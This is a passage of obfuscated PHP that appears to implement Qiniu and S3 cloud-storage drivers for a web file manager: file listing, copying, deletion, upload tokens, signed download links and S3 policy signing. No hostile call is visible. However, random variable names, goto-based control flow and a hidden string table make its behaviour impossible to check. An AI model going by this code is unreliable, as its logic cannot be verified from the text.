get_path_this($EÉáß‚ƒ‡); $D²÷åğ²ï = $DµÃ’ĞŸË¬ . $E…ÜÜğ†Ê™; goto b›ÜÑï³“½; b›ÜÑï³“½: if (!$this->mkfile($D²÷åğ²ï)) { return !1; } if (!$this->moveFile($D²÷åğ²ï, $DµÃ’ĞŸË¬)) { $this->delFile($D²÷åğ²ï); return !1; } return $this->getPathOuter($EÉáß‚ƒ‡); goto FƒÓãÀÛŞì; FƒÓãÀÛŞì: } public function copyFile($d¥Ãì øõ¥, $DÒÔÁ¶éï‡) { $C›ËÅ¬ŠŒ = $this->bucketManager->copy($this->bucket, $d¥Ãì øõ¥, $this->bucket, $DÒÔÁ¶éï‡, !0); return $C›ËÅ¬ŠŒ ? !1 : $this->getPathOuter($DÒÔÁ¶éï‡); } public function moveFile($CĞ¾÷¡˜Ôî, $EĞÑÍà—µÑ) { $D—µÜÛİòŠ = $this->bucketManager->move($this->bucket, $CĞ¾÷¡˜Ôî, $this->bucket, $EĞÑÍà—µÑ, !0); return $D—µÜÛİòŠ ? !1 : $this->getPathOuter($EĞÑÍà—µÑ); } public function delFile($B‰«¶˜•¼ª) { if (!$this->exist($B‰«¶˜•¼ª)) { return !0; } $d½¢Ï÷ø‡® = $this->bucketManager->delete($this->bucket, $B‰«¶˜•¼ª); return $d½¢Ï÷ø‡® ? !1 : !0; } public function delFolder($A…ç‰¿ïãÇ) { goto CóÜÕÚà†; eåĞÁÊ‡õö: $d»íîÕïŸÕ = $this->delByBatch($bÎ…¼¼áÖ[$AÇâÑ·Êñ[75]]); if (!$d»íîÕïŸÕ) { return !1; } return $this->delFile($cªÈÜ±Á¹…); goto b’«³†Ìì¢; a½–ëêÌÕÆ: if (!empty($A…ç‰¿ïãÇ) && $A…ç‰¿ïãÇ !== $AÇâÑ·Êñ[191] && !in_array($cªÈÜ±Á¹…, $bÎ…¼¼áÖ[$AÇâÑ·Êñ[75]])) { $bÎ…¼¼áÖ[$AÇâÑ·Êñ[75]][] = $cªÈÜ±Á¹…; } $d»íîÕïŸÕ = $this->delByBatch($bÎ…¼¼áÖ[$AÇâÑ·Êñ[74]]); if (!$d»íîÕïŸÕ) { return !1; } goto eåĞÁÊ‡õö; CóÜÕÚà†: $AÇâÑ·Êñ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->exist($A…ç‰¿ïãÇ)) { return !0; } $this->listItemCache = !1; goto Fœ‰öôÜóº; Fœ‰öôÜóº: $bÎ…¼¼áÖ = $this->fileList($A…ç‰¿ïãÇ); $this->listItemCache = !0; $cªÈÜ±Á¹… = trim($A…ç‰¿ïãÇ, $AÇâÑ·Êñ[8]) . $AÇâÑ·Êñ[8]; goto a½–ëêÌÕÆ; b’«³†Ìì¢: } private function delByBatch($bÇ¼Ôƒí‘½) { foreach (array_chunk($bÇ¼Ôƒí‘½, 1000) as $fóÃğªïŸ) { $E‡ˆ’ºŸ™ä = $this->bucketManager->buildBatchDelete($this->bucket, $fóÃğªïŸ); list($Bïö¥¶øÛç, $E‰¥©Íäôñ) = $this->bucketManager->batch($E‡ˆ’ºŸ™ä); if ($E‰¥©Íäôñ) { return !1; } } return !0; } public function rename($A“¶ÇÚ½×, $aÙññ´ôªÃ) { return $this->renameObject($A“¶ÇÚ½×, $aÙññ´ôªÃ); } public function fileInfo($CÙÒÅù³ó, $eªÒÀ¡Ó‘™ = false, $E¹Š·àêæê = array()) { goto CÃç¢ï¯¬å; EÄ ‰ñ¦¶¤: if (isset($E¹Š·àêæê[$Dù½°ãÃÕ•[1294]])) { $eäÆ¦ê‚‰ì[$Dù½°ãÃÕ•[84]] = substr($E¹Š·àêæê[$Dù½°ãÃÕ•[1294]] . $Dù½°ãÃÕ•[33], 0, 10); } if (isset($E¹Š·àêæê[$Dù½°ãÃÕ•[1293]])) { $eäÆ¦ê‚‰ì[$Dù½°ãÃÕ•[78]] = $E¹Š·àêæê[$Dù½°ãÃÕ•[1293]]; } return $eäÆ¦ê‚‰ì; goto aÁËÖõ‘ë˜; CË§¨ïê¦ê: $eäÆ¦ê‚‰ì[$Dù½°ãÃÕ•[194]] = $eäÆ¦ê‚‰ì[$Dù½°ãÃÕ•[84]] = 0; $eäÆ¦ê‚‰ì[$Dù½°ãÃÕ•[195]] = $eäÆ¦ê‚‰ì[$Dù½°ãÃÕ•[196]] = !0; if (empty($E¹Š·àêæê)) { $E¹Š·àêæê = $this->objectMeta($CÙÒÅù³ó); if (!$E¹Š·àêæê) { return $eäÆ¦ê‚‰ì; } } goto EÄ ‰ñ¦¶¤; CÃç¢ï¯¬å: $Dù½°ãÃÕ• =& $_SERVER[æ§›¦ÌáØ]; $eäÆ¦ê‚‰ì = array($Dù½°ãÃÕ•[28] => $this->pathThis($CÙÒÅù³ó), $Dù½°ãÃÕ•[76] => $this->getPathOuter($Dù½°ãÃÕ•[8] . $CÙÒÅù³ó), $Dù½°ãÃÕ•[29] => $Dù½°ãÃÕ•[193], $Dù½°ãÃÕ•[78] => isset($E¹Š·àêæê[$Dù½°ãÃÕ•[1293]]) ? $E¹Š·àêæê[$Dù½°ãÃÕ•[1293]] : 0, $Dù½°ãÃÕ•[168] => $this->ext($CÙÒÅù³ó)); if ($eªÒÀ¡Ó‘™) { return $eäÆ¦ê‚‰ì; } goto CË§¨ïê¦ê; aÁËÖõ‘ë˜: } public function folderInfo($BÖ×£„óÅº, $e‰íëŒÖÔ = false) { goto eÆø…Ç¼ô•; eÆø…Ç¼ô•: $F¢ÊÁŞÄ¬¦ =& $_SERVER[æ§›¦ÌáØ]; $AÂĞğÏæÓ = array($F¢ÊÁŞÄ¬¦[28] => $this->pathThis($BÖ×£„óÅº), $F¢ÊÁŞÄ¬¦[76] => $this->getPathOuter($F¢ÊÁŞÄ¬¦[8] . $BÖ×£„óÅº), $F¢ÊÁŞÄ¬¦[29] => $F¢ÊÁŞÄ¬¦[77]); if ($e‰íëŒÖÔ) { return $AÂĞğÏæÓ; } goto bÏ¬Ïªëì¹; bÏ¬Ïªëì¹: $AÂĞğÏæÓ[$F¢ÊÁŞÄ¬¦[194]] = $AÂĞğÏæÓ[$F¢ÊÁŞÄ¬¦[84]] = 0; $AÂĞğÏæÓ[$F¢ÊÁŞÄ¬¦[195]] = $AÂĞğÏæÓ[$F¢ÊÁŞÄ¬¦[196]] = !0; $BÖ×£„óÅº = rtrim($BÖ×£„óÅº, $F¢ÊÁŞÄ¬¦[8]) . $F¢ÊÁŞÄ¬¦[8]; goto dëåì¶×İŞ; dëåì¶×İŞ: $F–áËİß = $this->objectMeta($BÖ×£„óÅº); if (isset($F–áËİß[$F¢ÊÁŞÄ¬¦[1294]])) { $AÂĞğÏæÓ[$F¢ÊÁŞÄ¬¦[84]] = substr($F–áËİß[$F¢ÊÁŞÄ¬¦[1294]] . $F¢ÊÁŞÄ¬¦[33], 0, 10); } return $AÂĞğÏæÓ; goto AİŒ»ù˜ã›; AİŒ»ù˜ã›: } public function listPath($d¥±Õ³ÈĞË, $d©ää—İâ = false) { $Dµ­›µÇß½ =& $_SERVER[æ§›¦ÌáØ]; $d³‘Ø­²²Í = $this->fileList($d¥±Õ³ÈĞË, $Dµ­›µÇß½[8], !0); foreach ($d³‘Ø­²²Í[$Dµ­›µÇß½[75]] as $E¤°ïçÚÃÅ => $BçÊ‡ÉŒ) { $d³‘Ø­²²Í[$Dµ­›µÇß½[75]][$E¤°ïçÚÃÅ] = $this->folderInfo($BçÊ‡ÉŒ, $d©ää—İâ); } foreach ($d³‘Ø­²²Í[$Dµ­›µÇß½[74]] as $E¤°ïçÚÃÅ => $BçÊ‡ÉŒ) { $d³‘Ø­²²Í[$Dµ­›µÇß½[74]][$E¤°ïçÚÃÅ] = $this->fileInfo($BçÊ‡ÉŒ[$Dµ­›µÇß½[93]], $d©ää—İâ, $BçÊ‡ÉŒ); } return $d³‘Ø­²²Í; } public function has($D¸›‘ˆÕ, $BÛ­ç¼‹Ä = false, $dÓ…¼Ö‹Ú = true) { goto D°í×ªŠ±İ; cîªê§¸­‡: $DÑàîå¼»Ë = $B›•Åìœ‹Ò = 0; while (!0) { check_abort(); list($bö”ƒ’ìÒ, $f¯‡«´àÙô) = $this->bucketManager->listFiles($this->bucket, $AïÍñà×, $aŸ¼°£í…, $bñç¯²‚º«, $D¥ïîí§‹“); if ($f¯‡«´àÙô) { break; } $aŸ¼°£í… = array_key_exists($CÎ˜Ê©ÀĞ[1264], $bö”ƒ’ìÒ) ? $aŸ¼°£í… = $bö”ƒ’ìÒ[$CÎ˜Ê©ÀĞ[1295]] : $CÎ˜Ê©ÀĞ[33]; if ($BÛ­ç¼‹Ä) { if (!empty($bö”ƒ’ìÒ[$CÎ˜Ê©ÀĞ[1296]])) { $DÑàîå¼»Ë += count($bö”ƒ’ìÒ[$CÎ˜Ê©ÀĞ[1296]]); } if (!empty($bö”ƒ’ìÒ[$CÎ˜Ê©ÀĞ[1297]])) { $B›•Åìœ‹Ò += count($bö”ƒ’ìÒ[$CÎ˜Ê©ÀĞ[1297]]); } if ($aŸ¼°£í… === $CÎ˜Ê©ÀĞ[33]) { break; } continue; } if ($dÓ…¼Ö‹Ú) { if (!empty($bö”ƒ’ìÒ[$CÎ˜Ê©ÀĞ[1296]])) { return !0; } } else { if (!empty($bö”ƒ’ìÒ[$CÎ˜Ê©ÀĞ[1297]])) { return !0; } } if ($aŸ¼°£í… === $CÎ˜Ê©ÀĞ[33]) { break; } } if ($BÛ­ç¼‹Ä) { return array($CÎ˜Ê©ÀĞ[203] => $DÑàîå¼»Ë, $CÎ˜Ê©ÀĞ[204] => $B›•Åìœ‹Ò); } goto fò¾ƒšù„Ì; C“™ÆÊ¬‰ : $aŸ¼°£í… = $CÎ˜Ê©ÀĞ[33]; $bñç¯²‚º« = 500; $D¥ïîí§‹“ = $CÎ˜Ê©ÀĞ[8]; goto cîªê§¸­‡; fò¾ƒšù„Ì: return !1; goto E‰½‡š†; D°í×ªŠ±İ: $CÎ˜Ê©ÀĞ =& $_SERVER[æ§›¦ÌáØ]; $D¸›‘ˆÕ = trim($D¸›‘ˆÕ, $CÎ˜Ê©ÀĞ[8]); $AïÍñà× = empty($D¸›‘ˆÕ) && $D¸›‘ˆÕ !== $CÎ˜Ê©ÀĞ[191] ? $CÎ˜Ê©ÀĞ[33] : $D¸›‘ˆÕ . $CÎ˜Ê©ÀĞ[8]; goto C“™ÆÊ¬‰ ; E‰½‡š†: } public function listAll($B”­òÁ•ö¼) { $DôŠ£à¤¬Ù =& $_SERVER[æ§›¦ÌáØ]; $CÌ›¶§§² = $this->fileList($B”­òÁ•ö¼, $DôŠ£à¤¬Ù[33], !0); $A å¶¨²Ô = array(); foreach ($CÌ›¶§§²[$DôŠ£à¤¬Ù[74]] as $fáñâ­‘Ó²) { $A å¶¨²Ô[$fáñâ­‘Ó²[$DôŠ£à¤¬Ù[93]]] = $fáñâ­‘Ó²[$DôŠ£à¤¬Ù[78]]; } foreach ($CÌ›¶§§²[$DôŠ£à¤¬Ù[75]] as $fáñâ­‘Ó²) { if (is_string($fáñâ­‘Ó²)) { $A å¶¨²Ô[$fáñâ­‘Ó²] = 0; } } return $this->listAllFiles($B”­òÁ•ö¼, array_keys($A å¶¨²Ô), $A å¶¨²Ô); } private function fileList($e¼Š„ÄøŒ, $a‹“Š±ğ³Ø = '', $EÆäºª¯‡ = 0) { goto Då«íˆ¯ß; bó¶‰óƒè: $fë®¦¡èìÖ = $c›Î²äª­Š = array(); while (!0) { check_abort(); list($bÖŒÌÑåß, $fÀîŞöìŠó) = $this->bucketManager->listFiles($this->bucket, $Aƒ…÷£ö§, $dƒ¥ğåÛ×î, $dòÓôÃá´¿, $a‹“Š±ğ³Ø); if ($fÀîŞöìŠó) { break; } $dƒ¥ğåÛ×î = array_key_exists($F¶èèŸêĞ[1264], $bÖŒÌÑåß) ? $dƒ¥ğåÛ×î = $bÖŒÌÑåß[$F¶èèŸêĞ[1295]] : $F¶èèŸêĞ[33]; $B’ƒñ¨”Ü‰ = isset($bÖŒÌÑåß[$F¶èèŸêĞ[1296]]) ? $bÖŒÌÑåß[$F¶èèŸêĞ[1296]] : array(); $bƒ°ªï²’ = isset($bÖŒÌÑåß[$F¶èèŸêĞ[1297]]) ? $bÖŒÌÑåß[$F¶èèŸêĞ[1297]] : array(); foreach ($B’ƒñ¨”Ü‰ as $Dó»š…¨©ë) { goto d Ñİ¬Ú¼ù; d Ñİ¬Ú¼ù: if ($Dó»š…¨©ë[$F¶èèŸêĞ[93]] == $Aƒ…÷£ö§) { continue; } $Bµç•¯Ùê‡ = $Dó»š…¨©ë[$F¶èèŸêĞ[93]]; $cİçŞ†£ = $Dó»š…¨©ë[$F¶èèŸêĞ[1293]]; goto B´›ìœÄ–; B´›ìœÄ–: $Dó»š…¨©ë[$F¶èèŸêĞ[78]] = $cİçŞ†£; $e–ëâ »Ï = $cİçŞ†£ == 0 && substr($Bµç•¯Ùê‡, strlen($Bµç•¯Ùê‡) - 1, 1) == $F¶èèŸêĞ[8] ? !0 : !1; if ($Fî¤ÙÑËÓ„) { $this->cacheMethod($F¶èèŸêĞ[199], $Bµç•¯Ùê‡, $e–ëâ »Ï); $this->cacheMethod($F¶èèŸêĞ[200], $Bµç•¯Ùê‡, $Dó»š…¨©ë); } goto AóàÎƒÒ†Ñ; AóàÎƒÒ†Ñ: if ($e–ëâ »Ï) { $fë®¦¡èìÖ[] = $Bµç•¯Ùê‡; continue; } $c›Î²äª­Š[] = $EÆäºª¯‡ ? $Dó»š…¨©ë : $Bµç•¯Ùê‡; goto E—èó‚Ñº; E—èó‚Ñº: } foreach ($bƒ°ªï²’ as $Bµç•¯Ùê‡) { if ($Bµç•¯Ùê‡ == $Aƒ…÷£ö§) { continue; } $fë®¦¡èìÖ[] = $Bµç•¯Ùê‡; if ($Fî¤ÙÑËÓ„) { $this->cacheMethod($F¶èèŸêĞ[199], $Bµç•¯Ùê‡, !0); } } if ($dƒ¥ğåÛ×î === $F¶èèŸêĞ[33]) { break; } } if ($Fî¤ÙÑËÓ„) { $this->cacheMethod($F¶èèŸêĞ[199], $e¼Š„ÄøŒ, !0); } goto AÁ…¬åì•¿; AÁ…¬åì•¿: return array($F¶èèŸêĞ[75] => $fë®¦¡èìÖ, $F¶èèŸêĞ[74] => $c›Î²äª­Š); goto cØÅà­»Ÿ¬; Då«íˆ¯ß: $F¶èèŸêĞ =& $_SERVER[æ§›¦ÌáØ]; $e¼Š„ÄøŒ = trim($e¼Š„ÄøŒ, $F¶èèŸêĞ[8]); $Aƒ…÷£ö§ = empty($e¼Š„ÄøŒ) && $e¼Š„ÄøŒ !== $F¶èèŸêĞ[191] ? $F¶èèŸêĞ[33] : $e¼Š„ÄøŒ . $F¶èèŸêĞ[8]; goto cøƒÜ¢™µ¨; cøƒÜ¢™µ¨: $dƒ¥ğåÛ×î = $F¶èèŸêĞ[33]; $dòÓôÃá´¿ = 1000; $Fî¤ÙÑËÓ„ = $this->listItemCache === !1 ? !1 : !0; goto bó¶‰óƒè; cØÅà­»Ÿ¬: } public function canRead($Dô©ª©Å) { return $this->exist($Dô©ª©Å) ? !0 : !1; } public function canWrite($C˜š²â½Æå) { return $this->exist($C˜š²â½Æå) ? !0 : !1; } public function getContent($bø“æì‘…) { return $this->fileSubstr($bø“æì‘…, 0, -1); } public function setContent($féôÚÈ¡‚, $EËô¯¢Ï‹‹ = '') { $A™ƒÕ£Éø´ = $this->tempFile($this->pathThis($féôÚÈ¡‚)); file_put_contents($A™ƒÕ£Éø´, $EËô¯¢Ï‹‹); if ($this->upload($féôÚÈ¡‚, $A™ƒÕ£Éø´)) { $this->tempFileRemve($A™ƒÕ£Éø´); return !0; } return !1; } public function refreshUrls($F²³ºÓ) { goto bÉÙ²îƒé¥; D³²ä©Ï³–: return $a¹©Ñ®¼•[$e„Á´Ÿ–Ë[1068]] == $e„Á´Ÿ–Ë[713] ? !0 : !1; goto E¹¡×­ ; bÉÙ²îƒé¥: $e„Á´Ÿ–Ë =& $_SERVER[æ§›¦ÌáØ]; $B×ğãœÉğ„ = array(); if (is_array($F²³ºÓ)) { foreach ($F²³ºÓ as $eÄÎ“«Ù¿) { $B×ğãœÉğ„[] = $this->link($eÄÎ“«Ù¿); } } else { $B×ğãœÉğ„[] = $this->link($F²³ºÓ); } goto cêêíŒ®ó; cêêíŒ®ó: $CĞ¬‹›Â¹Æ = new Qiniu\Cdn\CdnManager($this->auth); list($a¹©Ñ®¼•, $c¡Œ½’Ş) = $CĞ¬‹›Â¹Æ->refreshUrls($B×ğãœÉğ„); if ($c¡Œ½’Ş) { return !1; } goto D³²ä©Ï³–; E¹¡×­ : } public function fileSubstr($cà…Œù’‰´, $dáµ°Á¢Ø, $fÕµŒŒê) { $b‘¾¹×–èè =& $_SERVER[æ§›¦ÌáØ]; if (!($eó¸ƒï‘¯„ = $this->link($cà…Œù’‰´))) { return !1; } $dóùÍğ³†¼ = !1; if ($fÕµŒŒê > 0) { $D¢×­åòì = $dáµ°Á¢Ø + $fÕµŒŒê - 1; $dóùÍğ³†¼ = array($b‘¾¹×–èè[1298] . $dáµ°Á¢Ø . $b‘¾¹×–èè[440] . $D¢×­åòì); } $BøõÎ‡ˆÁ© = url_request($eó¸ƒï‘¯„, $b‘¾¹×–èè[228], !1, $dóùÍğ³†¼); return $BøõÎ‡ˆÁ©[$b‘¾¹×–èè[703]] ? $BøõÎ‡ˆÁ©[$b‘¾¹×–èè[1078]] : !1; } public function upload($b‰Œ§ïô¡¥, $eˆó¥¼õê, $a¤ÃÁ–¤ = false, $DÅ‘¤¾ôÎæ = REPEAT_REPLACE) { $e¼ÉÑÅ¯Ê‚ = new Qiniu\Storage\UploadManager(); $B…ç¥œé…ä = $this->auth->uploadToken($this->bucket, $b‰Œ§ïô¡¥); $CÌ„ŸÕ ‹à = get_file_mime(get_path_ext($eˆó¥¼õê)); list($DôÅ…„ÇŒ», $f¨Ø¯›•”Å) = $e¼ÉÑÅ¯Ê‚->putFile($B…ç¥œé…ä, $b‰Œ§ïô¡¥, $eˆó¥¼õê, null, $CÌ„ŸÕ ‹à); return $f¨Ø¯›•”Å ? !1 : $this->getPathOuter($b‰Œ§ïô¡¥); } public function uploadFormData($F‚Œ»Õè¸ç, $Cá¿÷òÅŠ = 3600) { return $this->uploadToken($F‚Œ»Õè¸ç, $Cá¿÷òÅŠ); } public function multiUploadFormData($e¥Œ¾ƒ°â, $E†­Êé¤ƒÑ = 3600) { return $this->uploadToken($e¥Œ¾ƒ°â, $E†­Êé¤ƒÑ); } private function uploadToken($fŠÔÇßÍ, $cÄ£ÂøÅ‹Ô = 3600) { goto C°‚ô—Ş»°; FÃ’’Ñ•ô¼: $A­½æì±Í» = $fŠÔÇßÍ; $f«¿¥Ò“¤  = $this->auth->uploadToken($this->bucket, $A­½æì±Í», $EñëÅÍİÍÃ, $E•½®¡ºœ™, !0); $Aò…‡ùË… = empty($this->region) || $this->region == $B»ó‘¼Š…[1301] ? $B»ó‘¼Š…[33] : $B»ó‘¼Š…[440] . $this->region; goto AÅ»‚‘Á ¸; C°‚ô—Ş»°: $B»ó‘¼Š… =& $_SERVER[æ§›¦ÌáØ]; $EñëÅÍİÍÃ = $cÄ£ÂøÅ‹Ô; $E•½®¡ºœ™ = array($B»ó‘¼Š…[1299] => $B»ó‘¼Š…[1300]); goto FÃ’’Ñ•ô¼; AÅ»‚‘Á ¸: $f÷¹î´áÁ = http_type() . "\x3a\57\57\x75\x70\154\x6f\141\144{$Aò…‡ùË…}\x2e\x71\x69\156\151\165\160\56\x63\x6f\x6d\x2f"; return array($B»ó‘¼Š…[1302] => $f«¿¥Ò“¤ , $B»ó‘¼Š…[1303] => $f÷¹î´áÁ); goto aäóàª“À; aäóàª“À: } public function download($EÀì¬òØÜ, $a™ˆ‡´Ø™’) { goto e…Í„ßøÒ; BÎŠŠ’·®: $fÉ‘Ø‰¯Öê = 1024 * 200; $a’íäÛèÇÉ = fopen($CÆÈ˜äŒ®¼, $_SERVER[æ§›¦ÌáØ][1304]); while (!0) { $e»îŞÕÃ‹± = $this->fileSubstr($EÀì¬òØÜ, $F¹Ì‰Úâ, $fÉ‘Ø‰¯Öê); if ($e»îŞÕÃ‹± === !1) { return !1; } fwrite($a’íäÛèÇÉ, $e»îŞÕÃ‹±); $F¹Ì‰Úâ += $fÉ‘Ø‰¯Öê; if (strlen($e»îŞÕÃ‹±) < $fÉ‘Ø‰¯Öê) { break; } } goto dÑœï†êì›; e…Í„ßøÒ: $CÆÈ˜äŒ®¼ = IO::getPathInner(IO::mkfile($a™ˆ‡´Ø™’)); if (!($CÀŒ‹ºÀï¢ = $this->link($EÀì¬òØÜ))) { return !1; } $F¹Ì‰Úâ = 0; goto BÎŠŠ’·®; dÑœï†êì›: fclose($a’íäÛèÇÉ); return $a™ˆ‡´Ø™’; goto CóÚ¹†‘İŸ; CóÚ¹†‘İŸ: } public function link($bÆÅØØÍ¯µ, $cæóï³ÂÙ¾ = '') { if (!$this->isFile($bÆÅØØÍ¯µ)) { return !1; } $c¹éÚªñ¸³ = $this->getHost() . $_SERVER[æ§›¦ÌáØ][8] . $this->pathEncode($bÆÅØØÍ¯µ) . $cæóï³ÂÙ¾; return $this->auth->privateDownloadUrl($c¹éÚªñ¸³, 3600 * 12); } public function fileOut($aØ…º¿¸†‹, $C¬ñ‘ŒµË = false, $b†ÏÍ·°æê = false, $F‚œùƒÕŸ´ = '') { $c„ö†ªª„æ =& $_SERVER[æ§›¦ÌáØ]; if ($this->isFileOutServer()) { return $this->fileOutServer($aØ…º¿¸†‹, $C¬ñ‘ŒµË, $b†ÏÍ·°æê, $F‚œùƒÕŸ´); } if (!$b†ÏÍ·°æê) { $b†ÏÍ·°æê = $this->pathThis($aØ…º¿¸†‹); } $cÛº¬ÖÖñ° = $C¬ñ‘ŒµË ? $c„ö†ªª„æ[1305] . rawurlencode($b†ÏÍ·°æê) : $c„ö†ªª„æ[33]; $Eî˜ÒãŒ§ = $this->link($aØ…º¿¸†‹, $cÛº¬ÖÖñ°); $this->fileOutLink($Eî˜ÒãŒ§); } public function fileOutServer($bùÁô·Ê‘í, $bïïñÒ¨Ñó = false, $dáÚÃº™ = false, $e–¡ì†š‹Ê = '') { parent::fileOut($bùÁô·Ê‘í, $bïïñÒ¨Ñó, $dáÚÃº™, $e–¡ì†š‹Ê); } public function fileOutImage($B¼åçÔ÷øµ, $c¿¤•ïæ©å = 250) { $f‘§¾äÒŠÓ = $this->link($B¼åçÔ÷øµ, $_SERVER[æ§›¦ÌáØ][1306] . $c¿¤•ïæ©å); $this->fileOutLink($f‘§¾äÒŠÓ); } public function fileOutImageServer($E¾èÌ’Úœ†, $A¯ŒªÈ‘½‹ = 250) { parent::fileOutImage($E¾èÌ’Úœ†, $A¯ŒªÈ‘½‹); } public function hashMd5($FùÂÑÆøÇ) { $CƒñÏøº¡‘ =& $_SERVER[æ§›¦ÌáØ]; $DÊÉÔŸ¹Æª = $this->objectMeta($FùÂÑÆøÇ); return isset($DÊÉÔŸ¹Æª[$CƒñÏøº¡‘[208]]) ? $DÊÉÔŸ¹Æª[$CƒñÏøº¡‘[208]] : !1; $BŞîÂ†íš˜ = $this->link($FùÂÑÆøÇ, $CƒñÏøº¡‘[1307]); } public function size($f‡Ù¾ÊÖçâ) { $F¡½ñ¬‘ = $this->objectMeta($f‡Ù¾ÊÖçâ); return $F¡½ñ¬‘ ? $F¡½ñ¬‘[$_SERVER[æ§›¦ÌáØ][78]] : 0; } public function info($aŒô Ì£„) { if ($this->isFolder($aŒô Ì£„)) { return $this->folderInfo($aŒô Ì£„); } else { if ($this->isFile($aŒô Ì£„)) { return $this->fileInfo($aŒô Ì£„); } } return !1; } public function exist($c¢«•à›é–) { return $this->isFile($c¢«•à›é–) || $this->isFolder($c¢«•à›é–); } public function isFile($f¿´‹ÚÙø) { return !$this->isFolder($f¿´‹ÚÙø) && $this->objectMeta($f¿´‹ÚÙø); } public function isFolder($C“¡‰²×÷¾) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][199], $C“¡‰²×÷¾); } protected function objectMeta($aøÓ¾Ë“ê“) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][200], $aøÓ¾Ë“ê“); } protected function _objectMeta($A£àÔ’ë•) { $aã”ƒ­ ó© =& $_SERVER[æ§›¦ÌáØ]; list($A­„Óà´ó“, $CĞŒÀŠñ‚É) = $this->bucketManager->stat($this->bucket, $A£àÔ’ë•); if ($A­„Óà´ó“) { $A­„Óà´ó“[$aã”ƒ­ ó©[78]] = intval($A­„Óà´ó“[$aã”ƒ­ ó©[1293]]); } return $A­„Óà´ó“; } protected function _isFolder($a¬ÅäŸÆÓï) { $d‚µ§Õ“âª =& $_SERVER[æ§›¦ÌáØ]; if ($a¬ÅäŸÆÓï == $d‚µ§Õ“âª[33] || $a¬ÅäŸÆÓï == $d‚µ§Õ“âª[8]) { return !0; } list($BË¸²‡»Œˆ, $CãÃå§ÚëÀ) = $this->bucketManager->listFiles($this->bucket, trim($a¬ÅäŸÆÓï, $d‚µ§Õ“âª[8]) . $d‚µ§Õ“âª[8], $d‚µ§Õ“âª[33], 1, $d‚µ§Õ“âª[8]); return !empty($BË¸²‡»Œˆ[$d‚µ§Õ“âª[1296]]) || !empty($BË¸²‡»Œˆ[$d‚µ§Õ“âª[1297]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($e‘½‹ÁÆ¿Œ) { parent::__construct($e‘½‹ÁÆ¿Œ); } public function uploadFormData($f¬ğŠÓáÆ¸, $CğÕ‘òö½À = 3600) { goto dÕØ›Åó¨; dÕØ›Åó¨: $dÎ½ÊÖ‡â« =& $_SERVER[æ§›¦ÌáØ]; $BÉŠæ‘¸÷ñ = $dÎ½ÊÖ‡â«[192]; $e‹·ÈÎªº‡ = $dÎ½ÊÖ‡â«[1214]; goto a¸á°­óù; c¦ÈëÁ: $fª„´ò§§ = array($this->accessKey, $bÄÑŠ¹âÌ¾, $this->region, $c‡Û«ß , $bíñÇ±‚¿); $a’ÜâÖí = implode($dÎ½ÊÖ‡â«[8], $fª„´ò§§); $B˜‚‘È­™¯ = array($dÎ½ÊÖ‡â«[1181] => gmdate($dÎ½ÊÖ‡â«[1180], strtotime($dÎ½ÊÖ‡â«[1217])), $dÎ½ÊÖ‡â«[1182] => array(array($dÎ½ÊÖ‡â«[1184] => $this->bucket), array($dÎ½ÊÖ‡â«[1183] => $BÉŠæ‘¸÷ñ), array($dÎ½ÊÖ‡â«[1185], $dÎ½ÊÖ‡â«[1186], $dÎ½ÊÖ‡â«[33]), array($dÎ½ÊÖ‡â«[1185], $dÎ½ÊÖ‡â«[1218], $dÎ½ÊÖ‡â«[33]), array($dÎ½ÊÖ‡â«[1185], $dÎ½ÊÖ‡â«[1219], $dÎ½ÊÖ‡â«[33]), array($dÎ½ÊÖ‡â«[1187] => $bÂ»Øƒ‡²), array($dÎ½ÊÖ‡â«[1220] => $a’ÜâÖí), array($dÎ½ÊÖ‡â«[1221] => $e‹·ÈÎªº‡), array($dÎ½ÊÖ‡â«[1222] => $d¶¶­ˆëÒ), array($dÎ½ÊÖ‡â«[1223] => $AÛ Ô©™Î))); goto CÇùŠ²Ì; CÇùŠ²Ì: $D»öÇ²ˆ³Ù = base64_encode(json_encode($B˜‚‘È­™¯)); $e›Æ¥İáŠ« = hash_hmac($dÎ½ÊÖ‡â«[1224], $bÄÑŠ¹âÌ¾, $dÎ½ÊÖ‡â«[1225] . $this->secret, !0); $EéÍÔåœùØ = hash_hmac($dÎ½ÊÖ‡â«[1224], $this->region, $e›Æ¥İáŠ«, !0); goto C‰¸ö„®ÉÎ; CÕ…¢ƒÕ­¼: $FÒîìœ— ” = array($dÎ½ÊÖ‡â«[211] => $dÎ½ÊÖ‡â«[33], $dÎ½ÊÖ‡â«[1226] => $dÎ½ÊÖ‡â«[33], $dÎ½ÊÖ‡â«[1183] => $BÉŠæ‘¸÷ñ, $dÎ½ÊÖ‡â«[1187] => $bÂ»Øƒ‡², $dÎ½ÊÖ‡â«[1191] => $D»öÇ²ˆ³Ù, $dÎ½ÊÖ‡â«[1227] => $a’ÜâÖí, $dÎ½ÊÖ‡â«[1228] => $e‹·ÈÎªº‡, $dÎ½ÊÖ‡â«[1229] => $d¶¶­ˆëÒ, $dÎ½ÊÖ‡â«[1230] => $AÛ Ô©™Î, $dÎ½ÊÖ‡â«[1231] => $FÆ¨¯â¨„, $dÎ½ÊÖ‡â«[175] => $this->getHost()); return $FÒîìœ— ”; goto cêßÍ‡Ö•Â; a¸á°­óù: $c‡Û«ß  = $dÎ½ÊÖ‡â«[59]; $d¶¶­ˆëÒ = gmdate($dÎ½ÊÖ‡â«[1215]); $bÄÑŠ¹âÌ¾ = gmdate($dÎ½ÊÖ‡â«[704]); goto EØ³áº¥ó; C‰¸ö„®ÉÎ: $FÌÍ˜—ÚÈ = hash_hmac($dÎ½ÊÖ‡â«[1224], $c‡Û«ß , $EéÍÔåœùØ, !0); $déöÕÖºˆÄ = hash_hmac($dÎ½ÊÖ‡â«[1224], $bíñÇ±‚¿, $FÌÍ˜—ÚÈ, !0); $FÆ¨¯â¨„ = hash_hmac($dÎ½ÊÖ‡â«[1224], $D»öÇ²ˆ³Ù, $déöÕÖºˆÄ); goto CÕ…¢ƒÕ­¼; EØ³áº¥ó: $bíñÇ±‚¿ = $dÎ½ÊÖ‡â«[1216]; $AÛ Ô©™Î = $CğÕ‘òö½À . $dÎ½ÊÖ‡â«[33]; $bÂ»Øƒ‡² = $dÎ½ÊÖ‡â«[1179]; goto c¦ÈëÁ; cêßÍ‡Ö•Â: } public function multiUploadFormData($EİÕÎ÷É…õ, $Cæ´èíÏ— = 3600) { 